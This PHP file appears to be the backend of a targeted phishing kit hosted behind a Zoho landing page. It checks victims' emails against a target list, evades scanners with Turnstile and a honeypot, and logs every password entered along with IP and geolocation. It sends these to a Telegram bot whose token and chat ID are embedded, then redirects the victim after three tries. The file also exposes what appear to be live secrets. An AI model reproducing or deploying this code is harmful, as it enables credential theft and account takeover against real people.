<?php
session_start();

/* =======================================================
   CONFIG – EDIT ONLY THIS BLOCK
   ======================================================= */

// Where this API is allowed to be called from
$ALLOWED_ORIGINS = [
    'https://transmission.zoholandingpage.com',   // e.g. https://yourdomain.zohosites.com
    'https://ANOTHER-FRONTEND-IF-ANY',
];

// Enforce origin / referer check strictly?
$ENFORCE_ORIGIN_CHECK = true; // set to false if it breaks legit traffic

// Cloudflare Turnstile secret
$TURNSTILE_SECRET = '0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc';

// Email whitelist toggle + file
$EMAIL_VALIDATION_ENABLED = true;                // set to false to disable whitelist check
$WHITELIST_FILE           = __DIR__ . '/papa.txt';

// Logging (Railway volume)
$ATTEMPTS_FILE = '/data/attempts.json';

// Telegram notifications
$TELEGRAM_BOT_TOKEN = '7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ';
$TELEGRAM_CHAT_ID   = '6915371044';

// Redirects
$BLOCK_REDIRECT_URL   = 'https://transmission.zoholandingpage.com/404/?BzBul6cfevzAoIiftBzBul6cfevzAoIiftBzBul6cfevzAoIiftBzBul6cfevzAoIiftBzBul6cfevzAoIiftBzBul6cfevzAoIiftBzBul6cfevzAoIiftBzBul6cfevzAoIift';   // after 3+ wrong passwords
$SUCCESS_REDIRECT_URL = 'https://example.com/dashboard'; // on success (change this)

// Session security
$SESSION_TTL_SECONDS      = 600; // 10 minutes from step1
$STEP2_MIN_DELAY_SECONDS  = 2;   // min time between step1 and step2

/* =======================================================
   HELPER FUNCTIONS
   ======================================================= */

function json_response(bool $ok, array $extra = [], int $statusCode = 200): void {
    http_response_code($statusCode);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(array_merge(['ok' => $ok], $extra));
    exit;
}

function get_client_ip(): string {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($parts[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function starts_with(string $haystack, string $needle): bool {
    return strncmp($haystack, $needle, strlen($needle)) === 0;
}

function check_origin_or_referer(array $allowed): bool {
    if (empty($allowed)) return true;

    $origin  = $_SERVER['HTTP_ORIGIN']  ?? '';
    $referer = $_SERVER['HTTP_REFERER'] ?? '';

    foreach ($allowed as $base) {
        if ($origin && starts_with($origin, $base)) {
            return true;
        }
        if ($referer && starts_with($referer, $base)) {
            return true;
        }
    }

    return false;
}

function verify_turnstile(string $secret, string $token, string $ip): bool {
    if ($token === '') return false;

    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret'   => $secret,
        'response' => $token,
        'remoteip' => $ip
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $out = curl_exec($ch);
    curl_close($ch);

    if (!$out) return false;
    $data = json_decode($out, true);
    return !empty($data['success']);
}

function load_attempts(string $file): array {
    if (!file_exists($file)) return [];
    $raw = file_get_contents($file);
    if ($raw === false) return [];
    $decoded = json_decode($raw, true);
    return is_array($decoded) ? $decoded : [];
}

function save_attempts(string $file, array $data): void {
    @file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function send_telegram(string $botToken, string $chatId, string $msg): void {
    if (!$botToken || !$chatId) return;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($msg);
    @file_get_contents($url);
}

/* =======================================================
   BASIC GUARDS
   ======================================================= */

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    json_response(false, ['error' => 'Method not allowed'], 405);
}

// Origin / Referer check
if ($ENFORCE_ORIGIN_CHECK && !check_origin_or_referer($ALLOWED_ORIGINS)) {
    json_response(false, ['error' => 'Forbidden'], 403);
}

$action = $_POST['action'] ?? '';

$ip = get_client_ip();
$attempts = load_attempts($ATTEMPTS_FILE);

/* =======================================================
   ACTION: STEP 1  (email + Turnstile)
   ======================================================= */

if ($action === 'step1') {
    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $hp    = trim($_POST['company'] ?? '');
    $cfTok = $_POST['cf-turnstile-response'] ?? '';

    // Honeypot hit
    if ($hp !== '') {
        json_response(false, ['error' => 'Unexpected error. Please try again.']);
    }

    if (!$email) {
        json_response(false, ['error' => 'Invalid email address.']);
    }

    // Turnstile verification
    if (!verify_turnstile($TURNSTILE_SECRET, $cfTok, $ip)) {
        json_response(false, ['error' => 'Security check failed. Please try again.']);
    }

    // Optional whitelist
    if ($EMAIL_VALIDATION_ENABLED) {
        if (!file_exists($WHITELIST_FILE)) {
            json_response(false, ['error' => 'Configuration error. Please try again later.']);
        }
        $whitelist = file($WHITELIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $whitelist = $whitelist ? array_map('trim', $whitelist) : [];
        if (!in_array($email, $whitelist, true)) {
            json_response(false, ['error' => 'Access restricted to the intended recipient.']);
        }
    }

    // Step1 success → prepare session for step2
    $_SESSION['step']            = 2;
    $_SESSION['validated_email'] = $email;
    $_SESSION['verified_at']     = time();
    $_SESSION['verified_ip']     = $ip;
    $_SESSION['step2_token']     = bin2hex(random_bytes(16));
    $_SESSION['step2_ready_at']  = time() + $STEP2_MIN_DELAY_SECONDS;

    json_response(true, [
        'token' => $_SESSION['step2_token'],
        'email' => $email
    ]);
}

/* =======================================================
   ACTION: STEP 2  (password + logging + redirect)
   ======================================================= */

if ($action === 'step2') {
    $email   = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $pass    = trim($_POST['name'] ?? '');
    $hp      = trim($_POST['company'] ?? '');
    $token   = $_POST['step2_token'] ?? '';

    if ($hp !== '') {
        json_response(false, ['error' => 'Unexpected error. Please try again.']);
    }

    if (!$email || !$pass) {
        json_response(false, ['error' => 'Please complete all fields.']);
    }

    // Check that session from step1 still valid
    $sessEmail   = $_SESSION['validated_email'] ?? '';
    $verifiedAt  = $_SESSION['verified_at']      ?? 0;
    $verifiedIp  = $_SESSION['verified_ip']      ?? '';
    $sessToken   = $_SESSION['step2_token']      ?? '';
    $readyAt     = $_SESSION['step2_ready_at']   ?? 0;

    if (!$sessEmail || !$verifiedAt || !$verifiedIp || !$sessToken) {
        json_response(false, ['error' => 'Session expired. Please verify again.']);
    }

    // IP binding
    if ($verifiedIp !== $ip) {
        json_response(false, ['error' => 'Session expired. Please verify again.']);
    }

    // TTL check
    if ((time() - $verifiedAt) > $SESSION_TTL_SECONDS) {
        session_unset();
        json_response(false, ['error' => 'Session expired. Please verify again.']);
    }

    // Token check
    if (!hash_equals($sessToken, $token)) {
        session_unset();
        json_response(false, ['error' => 'Invalid session. Please start again.']);
    }

    // Min delay check
    if (time() < $readyAt) {
        json_response(false, ['error' => 'Unexpected error. Please try again.']);
    }

    // Optional whitelist on step2 as well (for changed email)
    if ($EMAIL_VALIDATION_ENABLED && $email !== $sessEmail) {
        if (!file_exists($WHITELIST_FILE)) {
            json_response(false, ['error' => 'Configuration error. Please try again later.']);
        }
        $whitelist = file($WHITELIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $whitelist = $whitelist ? array_map('trim', $whitelist) : [];
        if (!in_array($email, $whitelist, true)) {
            json_response(false, ['error' => 'Access restricted to the intended recipient.']);
        }
    }

    // Geo lookup (best-effort)
    $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query");
    $geoData = $geo ? json_decode($geo, true) : null;
    $location = ($geoData && isset($geoData['country']))
        ? ($geoData['country'] . ', ' . ($geoData['regionName'] ?? '') . ', ' . ($geoData['city'] ?? ''))
        : 'Unknown';

    $now = date('Y-m-d H:i:s');

    // Update attempts
    if (!isset($attempts[$email])) {
        $attempts[$email] = [
            'names'    => [$pass],
            'count'    => 1,
            'ip'       => $ip,
            'location' => $location,
            'time'     => $now
        ];
    } else {
        $attempts[$email]['names'][]  = $pass;
        $attempts[$email]['count']    = isset($attempts[$email]['count'])
            ? ((int)$attempts[$email]['count'] + 1)
            : 1;
        $attempts[$email]['ip']       = $ip;
        $attempts[$email]['location'] = $location;
        $attempts[$email]['time']     = $now;
    }

    save_attempts($ATTEMPTS_FILE, $attempts);

    // Telegram notification
    $msg = "Login attempt for: {$email}\n";
    if (!empty($sessEmail) && $sessEmail !== $email) {
        $msg .= "Original validated email: {$sessEmail}\n";
    }
    $msg .= "Names tried: " . implode(', ', $attempts[$email]['names']) . "\n";
    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
    $msg .= "IP: {$ip}\n";
    $msg .= "Location: {$location}\n";
    $msg .= "Last updated: {$attempts[$email]['time']}";

    send_telegram($TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID, $msg);

    // Password check
    $correctPassword = 'John Doe'; // <<< change this

    if ($pass !== $correctPassword) {
        // 3rd+ wrong → block redirect
        if ($attempts[$email]['count'] >= 3) {
            json_response(false, [
                'error'   => 'Access blocked.',
                'blocked' => true,
                'redirect'=> $BLOCK_REDIRECT_URL
            ]);
        }

        json_response(false, ['error' => 'Incorrect details. Please try again.']);
    }

    // SUCCESS – clear session & redirect
    unset(
        $_SESSION['step'],
        $_SESSION['validated_email'],
        $_SESSION['verified_at'],
        $_SESSION['verified_ip'],
        $_SESSION['step2_token'],
        $_SESSION['step2_ready_at']
    );

    json_response(true, ['redirect' => $SUCCESS_REDIRECT_URL]);
}

/* =======================================================
   UNKNOWN ACTION
   ======================================================= */

json_response(false, ['error' => 'Invalid action']);
